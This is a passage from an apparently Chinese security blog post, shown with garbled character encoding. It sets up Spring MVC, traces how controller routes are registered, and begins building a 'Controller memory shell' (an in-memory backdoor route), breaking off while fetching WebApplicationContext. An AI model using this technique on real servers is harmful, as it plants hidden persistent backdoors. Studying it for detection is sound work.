data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155144100.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é…ç½®tomcatï¼šè®¾ç½®tomcatä¸»ç›®å½•ä»¥åŠApplication contextè·¯å¾„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155425594.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113155425594.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>pom.xmlé‡ŒåŠ å…¥sping MVC5.3.21ä»¥åŠå…¶ä»–ä¾èµ–</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- SpringMVC --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.21<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- æ—¥å¿— --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- ServletAPI --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Spring5å’ŒThymeleafæ•´åˆåŒ… --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.thymeleaf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>thymeleaf-spring5<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.12.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨web.xmlä¸­æ·»åŠ DispatcherServletã€‚DispatcherServletçš„ä¸»è¦ä½œç”¨å°†webè¯·æ±‚ï¼Œæ ¹æ®é…ç½®çš„URL patternï¼Œå°†è¯·æ±‚åˆ†å‘ç»™Controllerå’ŒViewã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:SpringMVC.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åœ¨classpathï¼Œæˆ‘è¿™é‡Œæ˜¯src&#x2F;main&#x2F;resourcesä¸‹åˆ›å»ºSpringMVC.xmlæ ¸å¿ƒé…ç½®æ–‡ä»¶</p><p>åˆ›å»ºTestControllerç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹SpringMVC.xmlã€‚è¿™é‡Œspingä¼šè‡ªåŠ¨æ‰«æbase-packageä¸‹çš„javaæ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶ä¸­æœ‰@Service,@Component,@Repository,@Controllerç­‰è¿™äº›æ³¨è§£çš„ç±»ï¼Œåˆ™æŠŠè¿™äº›ç±»æ³¨å†Œä¸ºbean </p><blockquote><p>å±æ€§use-default-filters&#x3D;â€falseâ€è¡¨ç¤ºä¸è¦ä½¿ç”¨é»˜è®¤çš„è¿‡æ»¤å™¨</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">&quot;http://www.springframework.org/schema/mvc&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context-3.0.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/mvc/spring-mvc-4.3.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;org.example.springmvc&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span></span></span><br><span class="line"><span class="tag">            <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>/WEB-INF/<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span>.jsp<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>prefixè¡¨ç¤ºè·¯å¾„ï¼ŒsuffixæŒ‡å®šåç¼€</p><p>åœ¨WEB-INFä¸‹åˆ›å»ºlibç›®å½•ï¼Œå°†å¯ç”¨åº“å…¨éƒ¨æ‹–è¿›å»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113164444077.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113164444077.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å½“è®¿é—®indexæ—¶ï¼Œè¿”å›indexï¼Œæ ¹æ®SpringMVC.xmlé…ç½®çš„prefixï¼Œå»<code>/WEB-INF/</code>ä¸‹å¯»æ‰¾jspåç¼€çš„æ–‡ä»¶ã€‚</p><p>æ¯”å¦‚åœ¨&#x2F;WEB-INF&#x2F;ä¸‹å­˜æ”¾index.jspï¼Œè®¿é—®indexæ—¶ä¼šé€šè¿‡web.xmlä¸­å¯¼å…¥çš„DispatcherServletå¤„ç†è¯·æ±‚ï¼ŒDispatcherServletå‘é€åˆ°Controlleræ³¨è§£ç±»ï¼Œä¹Ÿå°±æ˜¯TestController# return indexã€‚ç„¶åç”±springMVCè§†å›¾è§£æå™¨å»&#x2F;WEB-INF&#x2F;ä¸‹å¯»æ‰¾indexä¸”ä¸ºjspåç¼€çš„æ–‡ä»¶ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171242640.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171242640.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171325985.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230113171325985.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…¶å®å¦‚æœå«Œé…ç½®éº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨springbootã€‚ç„¶åç›´æ¥å†™Controller</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><h3 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h3><p>Controllerè´Ÿè´£å¤„ç†DispatcherServletåˆ†å‘çš„è¯·æ±‚ã€‚å°†ç”¨æˆ·è¯·æ±‚å¤„ç†åå°è£…æˆmodelè¿”å›ç»™viewã€‚</p><p>åœ¨springmvcä¸­ç”¨@Controlleræ ‡è®°ä¸€ä¸ªç±»ä¸ºControllerã€‚ç„¶åç”¨@RequestMappingç­‰æ¥å®šä¹‰URLè¯·æ±‚å’ŒControlleræ–¹æ³•é—´çš„æ˜ å°„</p><h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p>org.springframework.context.ApplicationContextæ¥å£ä»£è¡¨äº†IoCå®¹å™¨ï¼Œè¯¥æ¥å£ç»§æ‰¿äº†BeanFactoryæ¥å£ã€‚</p><h3 id="ContextLoaderListener"><a href="#ContextLoaderListener" class="headerlink" title="ContextLoaderListener"></a>ContextLoaderListener</h3><p>ç”¨æ¥åˆå§‹åŒ–å…¨å±€å”¯ä¸€çš„Root Contextï¼Œä¹Ÿå°±æ˜¯Root WebApplicationContext.è¯¥WebApplicationContextå’Œå…¶ä»–å­Contextå…±äº«IOCå®¹å™¨ï¼Œå…±äº«bean</p><p>è®¿é—®å’Œæ“ä½œbeanå°±éœ€è¦è·å¾—å½“å‰ç¯å¢ƒApplicationContext</p><h2 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h2><p>åœ¨Controllerç±»æ‰“ä¸Šæ–­ç‚¹ï¼Œç„¶åè®¿é—®index</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230114193108680.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230114193108680.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="Controllerçš„æ³¨å†Œ"><a href="#Controllerçš„æ³¨å†Œ" class="headerlink" title="Controllerçš„æ³¨å†Œ"></a>Controllerçš„æ³¨å†Œ</h3><p>åœ¨DoDispatchå¤„ç”±DispatcherServletå¤„ç†webè¯·æ±‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130044552.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130044552.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨DispatcherServletè°ƒç”¨HandlerAdapter#handleå¤„ç†requestå’Œresponseã€‚å¹¶ä¸”æ­¤å¤„ç”¨getHandleræ–¹æ³•è·å–äº†mappedHandlerçš„Handler</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130226761.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115130226761.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¾€ä¸Šçœ‹ï¼ŒmappedHandleræ˜¯å¯¹handlerMappingsè¿›è¡Œéå†ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132840301.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132840301.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132941964.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115132941964.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æŒç»­è·Ÿè¿›mapping.getHandler(request)å‘ç°ï¼ŒAbstractHandlerMethodMapping#getHandlerInternal()ä¸­å¯¹mappingRegistryè¿›è¡Œä¸Šé”ï¼Œæœ€åè§£é”ã€‚ï¼ˆä¸è‡ªè§‰æƒ³èµ·äº†æ­»é”ï¼‰mappingRegistryå­˜å‚¨äº†è·¯ç”±ä¿¡æ¯ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133306441.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133306441.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨lookupHandlerMethodæ–¹æ³•ï¼Œä»mappingRegistryä¸­è·å–äº†è·¯ç”±</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133835103.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115133835103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>ä¹Ÿå°±æ˜¯è¯´æ¨¡æ‹Ÿæ³¨å†Œå‘mappingRegistryä¸­æ·»åŠ å†…å­˜é©¬è·¯ç”±ï¼Œå°±èƒ½æ³¨å…¥å†…å­˜é©¬ã€‚</p><p>åœ¨AbstractHandlerMethodMappingä¸­å°±æä¾›äº†registryMappingæ·»åŠ è·¯ç”±ã€‚ä½†æ˜¯è¯¥ç±»ä¸ºæŠ½è±¡ç±»ã€‚å®ƒçš„å­ç±»RequestMappingHandlerMappingèƒ½è¿›è¡Œå®ä¾‹åŒ–</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134351643.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134351643.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134525368.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115134525368.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="RequestMappingHandlerMappingåˆ†æ"><a href="#RequestMappingHandlerMappingåˆ†æ" class="headerlink" title="RequestMappingHandlerMappingåˆ†æ"></a>RequestMappingHandlerMappingåˆ†æ</h3><p>AbstractHandlerMethodMappingçš„afterPropertiesç”¨äºbeanåˆå§‹åŒ–</p><p>initHandlerMethod()éå†æ‰€æœ‰beanä¼ å…¥processCandidateBeanå¤„ç†beanï¼Œä¹Ÿå°±æ˜¯controller</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115142726301.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115142726301.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨processCandidateBeanä¸­ï¼ŒgetTypeè·å–beanç±»å‹ï¼Œé€šè¿‡isHandlerè¿›è¡Œç±»å‹åˆ¤æ–­ï¼Œå¦‚æœbeanæœ‰controlleræˆ–RequestMappingæ³¨è§£ï¼Œå°±è¿›å…¥detectHandlerMethodsè§£æbean</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115143202340.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115143202340.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨detectHandlerMethodsä¸­ï¼Œç”¨getMappingForMethodåˆ›å»ºRequestMappingInfo</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115144613123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¤„ç†å®Œåç”¨registryHandlerMethodå»ºç«‹æ–¹æ³•åˆ°RequestyMappingInfoçš„æ˜ å°„ã€‚ä¹Ÿå°±æ˜¯æ³¨å†Œè·¯ç”±</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115145218392.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230115145218392.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h4 id="mappingRegistryè·¯ç”±ä¿¡æ¯"><a href="#mappingRegistryè·¯ç”±ä¿¡æ¯" class="headerlink" title="mappingRegistryè·¯ç”±ä¿¡æ¯"></a>mappingRegistryè·¯ç”±ä¿¡æ¯</h4><p>registryä¼ å…¥çš„å‚æ•°mapping,handler,methodã€‚mappingå­˜å‚¨äº†æ–¹æ³•æ˜ å°„çš„URLè·¯å¾„ã€‚handlerä¸ºcontrollerå¯¹è±¡ã€‚methodä¸ºåå°„è·å–çš„æ–¹æ³•</p><h2 id="Controllerå†…å­˜é©¬æ„é€ "><a href="#Controllerå†…å­˜é©¬æ„é€ " class="headerlink" title="Controllerå†…å­˜é©¬æ„é€ "></a>Controllerå†…å­˜é©¬æ„é€ </h2><h3 id="1-è·å–WebApplicationContext"><a href="#1-è·å–WebApplicationContext" class="headerlink" title="1.è·å–WebApplicationContext"></a>1.è·å–WebApplicationContext</h3><p>åœ¨å†…å­˜é©¬çš„æ„é€ ä¸­ï¼Œéƒ½ä¼šè·å–å®¹å™¨çš„contextå¯¹è±¡ã€‚åœ¨Tomcatä¸­è·å–çš„æ˜¯StandardContextï¼Œspringä¸­è·å–çš„æ˜¯<code>WebApplicationContext</code>ã€‚ï¼ˆåœ¨controllerç±»å£°æ˜å¤„æ‰“ä¸Šæ–­ç‚¹å¯ä»¥çœ‹åˆ°åˆå§‹åŒ–<code>WebApplicationContext</code>çš„è¿‡ç¨‹ï¼‰WebApplicationContextç»§æ‰¿äº†BeanFactoryï¼Œæ‰€ä»¥èƒ½ç”¨getBeanç›´æ¥è·å–RequestMappingHandlerMappingï¼Œè¿›è€Œæ³¨å†Œè·¯ç”±ã€‚</p><p>æ‰€ä»¥é‡ç‚¹æ˜¯å¦‚ä½•è·å–WebApplicationContext</p><ul><li><p>åŸç†ï¼š</p></li><li><p>è·å–WebApplicationContext:</p><p>ç”±äºwebApplicationContextå¯¹è±¡å­˜æ”¾äºservletContextä¸­ã€‚å¹¶ä¸”é”®å€¼ä¸º<code>WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE</code></p><p>æ‰€ä»¥å¯ä»¥ç›´æ¥ç”¨servletContext#getAttribute()è·å–å±æ€§å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">wac</span> <span class="operator">=</span> (WebApplicationContext)servletContext.getAttribute(WebApplicationContext.ROOT_WEB_APPLICATION_CONTEXT_ATTRIBUTE);</span><br></pre></td></tr></table></figure><p>webApplicationContextUtilsæä¾›äº†ä¸‹é¢ä¸¤ç§æ–¹æ³•è·å–webApplicationContextã€‚éœ€è¦ä¼ å…¥servletContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebApplicationContextUtils.getRequeiredWebApplicationContext(ServletContext s);</span><br><span class="line">WebApplicationContextUtils.getWebApplicationContext(ServletContext s);</span><br></pre></td></tr></table></figure><blockquote><p>spring 5çš„WebApplicationContextUtilså·²ç»æ²¡æœ‰getWebApplicationContextæ–¹æ³•</p></blockquote></li><li><p>è·å–ServletContext</p><p>é€šè¿‡requestå¯¹è±¡æˆ–è€…ContextLoaderè·å–ServletContext</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> ContextLoader.getCurrentWebApplicationContext().getServletContext();</span><br></pre></td></tr></table></figure></li><li><p>è·å–requestå¯ä»¥ç”¨RequestContextHolder</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> ((ServletRequestAttributes) RequestContextHolder</span><br><span class="line">        .getRequestAttributes()).getRequest();</span><br></pre></td></tr></table></figure></li></ul><p>springä¸­è·å–contextçš„æ–¹å¼ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§</p><p>â‘ ç›´æ¥é€šè¿‡ContextLoaderè·å–ï¼Œä¸ç”¨å†ç»è¿‡servletContextã€‚ä¸è¿‡ContextLoaderä¸€èˆ¬ä¼šè¢«ban</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> 